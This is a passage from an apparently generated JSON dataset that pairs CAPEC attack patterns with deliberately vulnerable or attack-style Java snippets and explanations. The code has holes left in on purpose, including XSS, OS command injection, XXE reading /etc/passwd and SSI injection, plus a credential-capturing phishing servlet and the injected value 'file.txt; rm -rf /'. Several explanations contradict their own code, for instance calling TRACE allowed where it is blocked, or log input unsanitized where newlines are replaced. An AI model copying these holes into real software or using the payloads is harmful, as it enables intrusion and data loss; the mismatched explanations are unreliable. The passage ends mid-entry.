        "description": "This Java servlet code demonstrates a vulnerability where an HTTP header (Referer) is used directly in the HTML output without proper validation or sanitization. This can lead to Cross-Site Scripting (XSS) attacks if an attacker controls the Referer header. The code snippet embodies the main idea of CAPEC-202, 'XSS Through HTTP Headers', and is related to CWEs such as CWE-80, CWE-79, and CWE-644. The servlet reads the Referer header from the HTTP request and includes it in an HTML link, making it susceptible to XSS if the Referer header contains malicious script code."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/admin\")\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"role\") == null || !session.getAttribute(\"role\").equals(\"admin\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n            return;\n        }\n        // Sensitive operation\n        response.getWriter().println(\"Welcome to the admin panel!\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a basic implementation of access control for an admin panel. The servlet checks if the user has an active session and if the user's role is 'admin'. If these conditions are not met, it returns a 403 Forbidden error. This code is vulnerable to forceful browsing (CAPEC-111) if the authorization check is not properly enforced on all restricted URLs. The related CWEs are addressed as follows: CWE-425 (Direct Request) is mitigated by checking the session and role, CWE-285 (Improper Authorization) is addressed by verifying the user's role, CWE-693 (Protection Mechanism Failure) is handled by using session attributes for role verification, CWE-598 (Use of GET Request Method With Sensitive Query Strings) is avoided by not including sensitive information in the query string, and CWE-368 (Context Switching Race Condition) is not directly applicable in this context but would require careful handling of session state."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CommandInjectionExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        try {\n            // Vulnerable code: using untrusted input to build a command string\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a classic example of OS Command Injection vulnerability. The program takes a filename as a command-line argument and constructs a command string to display the contents of the file using the 'cat' command. The filename input is not validated or sanitized, allowing an attacker to inject arbitrary OS commands. For example, an attacker could provide a filename like 'file.txt; rm -rf /' to execute a malicious command. This snippet embodies the main idea of CAPEC-88 and related CWEs, such as CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class PharmingExample {\n    public static void main(String[] args) {\n        String targetUrl = \"http://trustedbank.com/login\";\n        try {\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            InetAddress addr = InetAddress.getByName(\"trustedbank.com\");\n            String hostname = addr.getHostName();\n            if (!hostname.equals(\"trustedbank.com\")) {\n                throw new UnknownHostException(\"Hostname verification failed\");\n            }\n\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(targetUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            conn.disconnect();\n\n            // CWE-346: Origin Validation Error\n            if (!url.getHost().equals(\"trustedbank.com\")) {\n                throw new SecurityException(\"Origin validation failed\");\n            }\n\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            if (content.toString().contains(\"<script>\")) {\n                throw new SecurityException(\"Client-side security enforcement failed\");\n            }\n\n            System.out.println(\"Successfully connected to trusted site.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a pharming attack could occur due to several security weaknesses. The code attempts to connect to a supposedly trusted URL (http://trustedbank.com/login) and perform some basic security checks. It includes the following vulnerabilities:\n\n1. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The code performs a reverse DNS lookup to verify the hostname, which can be spoofed.\n2. **CWE-494: Download of Code Without Integrity Check** - The code downloads content from the URL without verifying its integrity.\n3. **CWE-346: Origin Validation Error** - The code checks the origin of the URL but does not do so securely.\n4. **CWE-602: Client-Side Enforcement of Server-Side Security** - The code relies on client-side checks to enforce security, which can be bypassed.\n\nThe main idea of the CAPEC (Pharming) is represented by showing how an attacker could redirect the victim to a malicious site that appears to be trusted, exploiting these weaknesses to capture sensitive data."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ReflectionAttackExample {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"localhost\", 8080);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n        // Simulate sending a challenge to the server\n        String challenge = \"12345\";\n        out.println(challenge);\n\n        // Read the server's response (which is the same challenge in this vulnerable example)\n        String serverResponse = in.readLine();\n\n        // Reflect the server's response back to it\n        out.println(serverResponse);\n\n        // Check if authentication is successful\n        String authResult = in.readLine();\n        if (\"AUTH_SUCCESS\".equals(authResult)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a reflection attack vulnerability in an authentication protocol. The client sends a challenge to the server, receives the same challenge back, and then reflects it back to the server. The server incorrectly authenticates the client based on the reflected challenge, demonstrating a reflection attack (CWE-301). This example also touches on CWE-303, as the authentication algorithm is incorrectly implemented, allowing the reflection attack to succeed. The code highlights the risk of simple challenge-response mechanisms that do not properly differentiate between legitimate and reflected responses."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"imgSrc\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"' />\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to improper neutralization of script in attributes of IMG tags (CWE-82). The servlet takes a user-provided parameter 'imgSrc' and directly inserts it into the 'src' attribute of an IMG tag without any sanitization or validation. This can lead to Cross-Site Scripting (XSS) attacks if an attacker provides a malicious script as the 'imgSrc' parameter. For example, an attacker could provide a value like 'javascript:alert(1)' to execute arbitrary JavaScript in the context of the victim's browser. This code snippet embodies the main idea of the deprecated CAPEC-16, which is now part of CAPEC-18, by showing how improper handling of user input in non-script elements can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "public class IntegerOverflowExample {\n    public static void main(String[] args) {\n        int maxValue = Integer.MAX_VALUE;\n        int[] buffer = new int[10];\n\n        // Simulate user-controlled input that causes overflow\n        int userInput = 1;\n        int newSize = maxValue + userInput; // Integer overflow occurs here\n\n        // Allocate memory based on the overflowed value\n        int[] newBuffer = new int[newSize]; // This will throw NegativeArraySizeException\n\n        // Copy data to the new buffer without checking size\n        System.arraycopy(buffer, 0, newBuffer, 0, buffer.length); // Potential buffer overflow\n    }\n}",
        "description": "This Java code snippet demonstrates a forced integer overflow vulnerability. The variable `maxValue` is set to `Integer.MAX_VALUE`, the maximum value an integer can hold. The `userInput` is controlled by the attacker and is set to 1. When `newSize` is calculated as `maxValue + userInput`, an integer overflow occurs, causing `newSize` to wrap around to a negative value. This negative value is then used to allocate a new buffer, leading to a `NegativeArraySizeException`. Additionally, the `System.arraycopy` call can lead to a buffer overflow if the sizes are not properly checked. This example embodies the main idea of the CAPEC by demonstrating how an attacker can force an integer variable to go out of range, leading to unexpected behavior and potential vulnerabilities such as buffer overflows."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class LogInjectionExample {\n    private static final Logger logger = Logger.getLogger(LogInjectionExample.class.getName());\n\n    public static void main(String[] args) {\n        String userInput = \"User input with malicious intent\\nINFO: User logged in\";\n        logUserAction(userInput);\n    }\n\n    public static void logUserAction(String userInput) {\n        try (FileWriter fw = new FileWriter(\"app.log\", true)) {\n            // CWE-117: Improper Output Neutralization for Logs\n            // CWE-75: Failure to Sanitize Special Elements into a Different Plane\n            // CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n            String sanitizedInput = userInput.replaceAll(\"[\\n\\r]\", \"_\");\n            fw.write(\"User action: \" + sanitizedInput + \"\\n\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Failed to write to log file\", e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that is susceptible to log injection attacks. The `logUserAction` method writes user input directly to a log file without proper sanitization, allowing an attacker to inject malicious log entries. The code attempts to sanitize the input by replacing newline characters, but it may not be sufficient to neutralize all special elements. This example highlights the importance of proper output neutralization (CWE-117), sanitization of special elements (CWE-75), and neutralization of escape sequences (CWE-150) to prevent log injection attacks. Additionally, it underscores the risk of inserting sensitive information into log files (CWE-532) and logging excessive data (CWE-779)."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.net.ssl.*;\n\npublic class VulnerableMITM {\n    public static void main(String[] args) throws Exception {\n        // Create a socket to connect to the server\n        Socket socket = new Socket(\"example.com\", 443);\n        InputStream in = socket.getInputStream();\n        OutputStream out = socket.getOutputStream();\n\n        // Create a buffer to read data\n        byte[] buffer = new byte[4096];\n        int bytesRead;\n\n        // Read data from the server\n        while ((bytesRead = in.read(buffer)) != -1) {\n            // Print the data to the console (simulating interception)\n            System.out.write(buffer, 0, bytesRead);\n\n            // Forward the data to the client (simulating a MITM attack)\n            out.write(buffer, 0, bytesRead);\n        }\n\n        // Close the socket\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic Adversary in the Middle (AiTM) attack. The code creates a socket connection to a server (example.com on port 443) and reads data from the server. It then prints the intercepted data to the console and forwards it to the client, simulating a man-in-the-middle attack. This code embodies the main idea of CAPEC-94 by showing how an adversary can intercept and alter communication between a client and a server. The code also highlights related CWEs, such as CWE-300 (Channel Accessible by Non-Endpoint) and CWE-287 (Improper Authentication), by not verifying the identity of the endpoints and allowing unauthorized access to the communication channel."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import javax.xml.ws.Service;\nimport javax.xml.namespace.QName;\nimport java.net.URL;\n\npublic class WSDLScanner {\n    public static void main(String[] args) {\n        try {\n            // URL of the WSDL file\n            URL wsdlURL = new URL(\"http://example.com/service?wsdl\");\n            // QName of the service\n            QName qname = new QName(\"http://example.com/\", \"ExampleService\");\n            // Create a service instance\n            Service service = Service.create(wsdlURL, qname);\n\n            // Attempt to access a method that might not be intended for public use\n            Object port = service.getPort(Object.class);\n            // Simulate sending a malicious request\n            String maliciousPayload = \"<script>alert('XSS')</script>\";\n            port.getClass().getMethod(\"someMethod\", String.class).invoke(port, maliciousPayload);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a WSDL scanning attack. The code accesses a WSDL file from a given URL and attempts to interact with the web service described by the WSDL. It tries to invoke a method on the service, potentially using a malicious payload. This represents the CAPEC concept of scanning WSDL interfaces to reveal sensitive information and exploit vulnerabilities. The code also touches on related CWEs by showing how sensitive information in WSDL files can be exposed and misused, leading to potential security breaches such as command injection or unauthorized access."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        try {\n            // Attempt to load a third-party library\n            System.loadLibrary(\"thirdPartyLib\");\n            // Call a function from the third-party library\n            ThirdPartyLib.someFunction();\n        } catch (UnsatisfiedLinkError e) {\n            // Improper error handling\n            System.out.println(\"Library not found, continuing execution...\");\n        }\n\n        // Use of a non-ubiquitous API\n        try {\n            File file = new File(\"/path/to/file\");\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[1024];\n            int bytesRead = fis.read(data);\n            // Improper restriction of operations within the bounds of a memory buffer\n            for (int i = 0; i <= bytesRead; i++) {\n                System.out.print((char) data[i]);\n            }\n            fis.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ThirdPartyLib {\n    public static void someFunction() {\n        // Simulate some functionality\n        System.out.println(\"Third-party library function called.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that attempts to load and use a third-party library. If the library is not found, the application continues execution without proper error handling, potentially leaving the system in an insecure state (CAPEC-212). The code also uses a non-ubiquitous API (CWE-589) and performs operations on a memory buffer without proper bounds checking (CWE-119). The main idea is to show how blocking access to external libraries and improper error handling can lead to security vulnerabilities."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import java.security.SecureRandom;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.IvParameterSpec;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // Use of a broken or risky cryptographic algorithm (CWE-327)\n        String algorithm = \"DES\"; // DES is considered broken and insecure\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Generation of weak initialization vector (IV) (CWE-1204)\n        byte[] iv = new byte[8]; // DES block size is 8 bytes\n        SecureRandom random = new SecureRandom();\n        random.nextBytes(iv); // IV is not sufficiently unpredictable\n        IvParameterSpec ivSpec = new IvParameterSpec(iv);\n\n        // Use of a cryptographic primitive with a risky implementation (CWE-1240)\n        Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);\n\n        String plaintext = \"Sensitive Data\";\n        byte[] ciphertext = cipher.doFinal(plaintext.getBytes());\n\n        System.out.println(\"Ciphertext: \" + new String(ciphertext));\n    }\n}",
        "description": "This Java code snippet demonstrates several cryptographic vulnerabilities as described in the CAPEC and related CWEs. The code uses the DES algorithm, which is considered broken and insecure (CWE-327). It generates a weak initialization vector (IV) that is not sufficiently unpredictable (CWE-1204). Additionally, it uses a cryptographic primitive with a risky implementation (CWE-1240). The main idea of the CAPEC is to highlight how weaknesses in cryptographic algorithms and their implementations can be exploited to compromise the security of encrypted data."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/phishing\")\npublic class PhishingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"url\");\n        if (redirectUrl != null && !redirectUrl.isEmpty()) {\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.getWriter().println(\"<html><body>\");\n            response.getWriter().println(\"<h1>Login</h1>\");\n            response.getWriter().println(\"<form method='POST' action='/phishing'>\");\n            response.getWriter().println(\"Username: <input type='text' name='username'><br>\");\n            response.getWriter().println(\"Password: <input type='password' name='password'><br>\");\n            response.getWriter().println(\"<input type='submit' value='Login'>\");\n            response.getWriter().println(\"</form>\");\n            response.getWriter().println(\"</body></html>\");\n        }\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n        // Here, the credentials could be logged or sent to an attacker-controlled server\n        System.out.println(\"Phished credentials: \" + username + \", \" + password);\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Login Successful</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a basic phishing attack. The `doGet` method displays a fake login form to the user, while the `doPost` method captures the submitted credentials and logs them, simulating the theft of user information. Additionally, the `doGet` method includes an open redirect vulnerability (CWE-601) by redirecting to a URL specified by the user, which can be exploited to direct users to malicious sites. This code embodies the main idea of phishing by masquerading as a legitimate login page to steal user credentials and includes elements of UI misrepresentation (CWE-451) and open redirection (CWE-601)."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlInput = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                          \"<!DOCTYPE root [<!ENTITY ext SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                          \"<root>&ext;</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // The following line is commented out to demonstrate the vulnerability\n            // factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlInput)));\n            System.out.println(\"Parsed XML: \" + document.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to an XML External Entity (XXE) attack. The code reads an XML input containing an external entity reference to a local file (e.g., /etc/passwd). The DocumentBuilderFactory is not configured to prevent external entity expansion, making the application vulnerable to XXE attacks. This vulnerability is related to CWE-611 (Improper Restriction of XML External Entity Reference). The code also lacks proper XML validation against a schema, which is related to CWE-112 (Missing XML Validation). The main idea of the CAPEC is to highlight the risks associated with improperly configured XML parsers, which can lead to various security issues such as information disclosure and injection attacks."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class BufferOverflowExample {\n    public static void main(String[] args) {\n        String filePath = \"input.txt\";\n        char[] buffer = new char[10]; // Small buffer size\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            int charsRead = reader.read(buffer, 0, 50); // Attempt to read more than buffer size\n            System.out.println(\"Read \" + charsRead + \" characters.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability. The buffer is allocated with a fixed size of 10 characters, but the code attempts to read up to 50 characters from a file into this buffer. This can lead to a buffer overflow as the code does not check if the input size exceeds the buffer size. This example embodies the main idea of CAPEC 'Overflow Buffers' and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableSSIServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n\n        // Vulnerable code: directly including user input in the response\n        out.println(\"<!--#include file='\" + userInput + \"' -->\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Server Side Include (SSI) Injection vulnerability. The servlet takes user input from a request parameter and directly includes it in the response as an SSI directive. This can allow an attacker to inject malicious SSI directives, leading to arbitrary code execution or information disclosure. The code does not properly neutralize or validate the user input (CWE-97, CWE-20), and it constructs part of the response using externally-influenced input without neutralizing special elements (CWE-74)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableSessionSidejacking {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"http://example.com/login\"); // CWE-319: Cleartext Transmission of Sensitive Information\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n\n        String credentials = \"username=user&password=pass\"; // CWE-522: Insufficiently Protected Credentials\n        OutputStream os = connection.getOutputStream();\n        os.write(credentials.getBytes());\n        os.flush();\n        os.close();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n\n        String sessionToken = connection.getHeaderField(\"Set-Cookie\"); // CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n        System.out.println(\"Session Token: \" + sessionToken);\n\n        // Simulate session sidejacking by reusing the session token\n        URL protectedUrl = new URL(\"http://example.com/protected\");\n        HttpURLConnection protectedConnection = (HttpURLConnection) protectedUrl.openConnection();\n        protectedConnection.setRequestProperty(\"Cookie\", sessionToken); // CWE-294: Authentication Bypass by Capture-replay\n\n        BufferedReader protectedIn = new BufferedReader(new InputStreamReader(protectedConnection.getInputStream()));\n        String protectedInputLine;\n        StringBuilder protectedResponse = new StringBuilder();\n\n        while ((protectedInputLine = protectedIn.readLine()) != null) {\n            protectedResponse.append(protectedInputLine);\n        }\n        protectedIn.close();\n\n        System.out.println(\"Protected Response: \" + protectedResponse.toString());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that can be exploited through session sidejacking. The code sends login credentials in cleartext (CWE-319) to a server over an unencrypted HTTP connection. The credentials are insufficiently protected (CWE-522), and the session token is retrieved without the 'Secure' attribute (CWE-614). The session token is then reused to access a protected resource, simulating an authentication bypass by capture-replay (CWE-294). This example highlights the risks of transmitting sensitive information without proper encryption and the potential for session hijacking attacks."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class ClickjackingVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome to the vulnerable page</h1>\");\n        response.getWriter().println(\"<button onclick=\\\"performSensitiveAction()\\\">Click me</button>\");\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"function performSensitiveAction() {\");\n        response.getWriter().println(\"  // Sensitive action performed here\");\n        response.getWriter().println(\"  alert('Sensitive action performed!');\");\n        response.getWriter().println(\"}\");\n        response.getWriter().println(\"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}\n\n// No X-Frame-Options header is set, making this page vulnerable to clickjacking.",
        "description": "This Java servlet code represents a web page that is vulnerable to clickjacking. The servlet generates an HTML page with a button that performs a sensitive action when clicked. However, the response does not include the 'X-Frame-Options' header, which would prevent the page from being embedded in a frame. This omission allows an attacker to embed this page in an iframe on a malicious site, tricking users into performing actions on the vulnerable site while they believe they are interacting with the malicious site. This example also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the page from being framed, which is a common cause of clickjacking vulnerabilities."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class CrossZoneScriptingExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String zone = request.getParameter(\"zone\");\n\n        // CWE-20: Improper Input Validation\n        if (zone == null || (!zone.equals(\"trusted\") && !zone.equals(\"untrusted\"))) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid zone\");\n            return;\n        }\n\n        // CWE-116: Improper Encoding or Escaping of Output\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<div>\" + userInput + \"</div>\");\n\n        // CWE-285: Improper Authorization\n        if (zone.equals(\"trusted\")) {\n            // CWE-250: Execution with Unnecessary Privileges\n            executePrivilegedAction(userInput);\n        }\n    }\n\n    private void executePrivilegedAction(String input) {\n        // Simulate privileged action\n        System.out.println(\"Executing privileged action with input: \" + input);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross Zone Scripting vulnerability. The servlet processes user input and a security zone parameter. It fails to properly validate the user input (CWE-20) and does not encode the output correctly (CWE-116), allowing for potential script injection. The code also improperly authorizes actions based on the zone parameter (CWE-285) and performs actions with unnecessary privileges (CWE-250). If the zone is 'trusted', it executes a privileged action without sufficient checks, representing a privilege elevation attack targeted at zone-based web-browser security."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable code: does not neutralize CRLF sequences\n        response.setHeader(\"X-User-Input\", userInput);\n        response.getWriter().println(\"Header set with user input\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to HTTP Request Splitting (CAPEC-33) and HTTP Request/Response Smuggling (CWE-113). The servlet takes a user input from an HTTP GET request parameter and directly sets it as a header in the HTTP response without proper sanitization. If an attacker includes CRLF sequences in the input, they can inject additional headers or even split the HTTP response, leading to potential security issues such as HTTP response splitting or smuggling. This code highlights the importance of properly neutralizing special elements in user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    private static final Logger logger = Logger.getLogger(VulnerableServlet.class.getName());\n\n    public VulnerableServlet() throws IOException {\n        FileHandler fh = new FileHandler(\"app.log\", true);\n        fh.setFormatter(new SimpleFormatter());\n        logger.addHandler(fh);\n    }\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        logger.info(\"User input: \" + userInput);\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is logged and then directly included in an HTML response without proper sanitization. The `doGet` method retrieves a parameter from the HTTP request, logs it, and then includes it in the HTML response. This can lead to Cross-Site Scripting (XSS) if the user input contains malicious scripts. Additionally, the logged user input can be exploited if the log files are exposed, leading to potential information exposure. This code snippet embodies the main idea of the deprecated CAPEC 'XSS through Log Files' by showing how improper handling of user input can lead to both XSS and information exposure vulnerabilities."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-693: Protection Mechanism Failure\n        // Allowing TRACE method which can be exploited for XST\n        if (request.getMethod().equalsIgnoreCase(\"TRACE\")) {\n            response.setStatus(HttpServletResponse.SC_METHOD_NOT_ALLOWED);\n            response.getWriter().write(\"TRACE method is not allowed\");\n            return;\n        }\n\n        // CWE-79: Improper Neutralization of Input During Web Page Generation\n        String userInput = request.getParameter(\"input\");\n        response.getWriter().write(\"User input: \" + userInput);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to Cross Site Tracing (XST) by allowing the TRACE method, which can be exploited to steal session cookies and other sensitive information. The code also includes an example of improper neutralization of user input (CWE-79), which can lead to Cross-Site Scripting (XSS) attacks. The TRACE method is explicitly checked and disallowed, but the improper handling of user input remains, illustrating the potential for multiple vulnerabilities in a web application."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
